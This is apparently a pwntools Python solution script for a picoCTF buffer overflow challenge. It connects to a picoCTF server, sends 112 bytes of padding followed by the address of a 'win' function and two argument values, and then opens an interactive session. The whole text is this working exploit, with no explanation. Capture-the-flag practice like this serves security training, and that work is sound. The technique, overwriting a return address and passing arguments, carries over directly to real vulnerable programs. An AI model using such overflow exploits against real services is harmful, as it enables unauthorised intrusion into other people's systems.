from pwn import *

elf = context.binary = ELF("./vuln")

p = remote('saturn.picoctf.net', 63672)

OFFSET = 112

if __name__ == '__main__':
	payload = b"A" * OFFSET + p32(elf.symbols['win']) + p32(0) + p32(0xCAFEF00D) + p32(0xF00DF00D)

	p.sendlineafter(b"Please enter your string: ", payload)

	p.interactive()